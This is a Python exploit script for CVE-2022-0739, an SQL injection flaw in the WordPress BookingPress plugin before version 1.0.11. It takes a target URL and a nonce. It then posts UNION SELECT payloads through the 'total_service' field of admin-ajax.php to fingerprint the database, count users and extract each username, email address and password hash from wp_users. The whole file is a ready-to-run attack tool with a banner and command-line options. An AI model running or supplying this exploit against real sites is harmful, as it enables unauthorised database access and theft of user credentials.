#!/usr/bin/python3

import sys
from argparse import ArgumentParser
import requests as req
from json import loads 
from random import randint

banner = '''
  ____   ___   ___  _    _             _____     ____  _____ _____ 
 |  _ \ / _ \ / _ \| |  (_)           |  __ \   |___ \| ____| ____|
 | |_) | | | | | | | | ___ _ __   __ _| |__) | __ __) | |__ | |__  
 |  _ <| | | | | | | |/ / | '_ \ / _` |  ___/ '__|__ <|___ \|___ \ 
 | |_) | |_| | |_| |   <| | | | | (_| | |   | |  ___) |___) |___) |
 |____/_\___/ \___/|_|\_\_|_| |_|\__, |_|   |_| |____/|____/|____/ 
 |  ____|         /_ |/ _ \(_) |  __/ |                            
 | |__  __  ___ __ | | | | |_| |_|___/                             
 |  __| \ \/ / '_ \| | | | | | __|                                 
 | |____ >  <| |_) | | |_| | | |_                                  
 |______/_/\_\ .__/|_|\___/|_|\__|                                 
             | |                                                   
             |_|                                                   
'''

ap = ArgumentParser()
ap.add_argument('-u','--url',dest='url',help='WordPress\'s URL of vulnerable plugin... example: http://vulnsite.com',required=True)
ap.add_argument('-n','--nonce',dest='nonce',help='nonce value of unauthenticated users, if you can use burp_suite then who get it easy',required=True)

payload1 = ") UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -"
payload2 = ") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -"

def gen_payload(nonce, sqli_postfix, category_id=1):
    return {
            'action': 'bookingpress_front_get_category_services',
            '_wpnonce': nonce,
            'category_id':category_id,
            'total_service': f'{randint(100,10000)}{sqli_postfix}'
    }

if __name__ == '__main__':

    print(banner)
    print("CVE-2022-0739")
    print("BookingPress Exploit")
    print("[SQLI BookingPress before 1.0.11]")

    i = 0

    args = ap.parse_args()
    url,nonce = args.url,args.nonce
    sessions = req.session()

    vuln_url = f'{url}/wp-admin/admin-ajax.php'
    payload = gen_payload(nonce,payload1)
    
    res = sessions.post(vuln_url, data=payload)

    try:
        res = list(loads(res.text)[0].values())

    except Exception as e:
        print("Plugin no vulnerable or nonce is wrong!!!!!")
        exit(-1)
    cnt = int(res[7])

    print('[+]DB fingerprint:',res[0])
    print('[+]Login User Count: ',cnt)

    for i in range(cnt):
        try:
            user_payload = gen_payload(nonce,payload2.format(off=i))
            u_data = list(loads(sessions.post(vuln_url,user_payload).text)[0].values())
            print(f"[+]Username     : {u_data[0]}")
            print(f"[+]MailAddress  : {u_data[1]}")
            print(f"[+]Password_hash: {u_data[2]}")

        except: continue
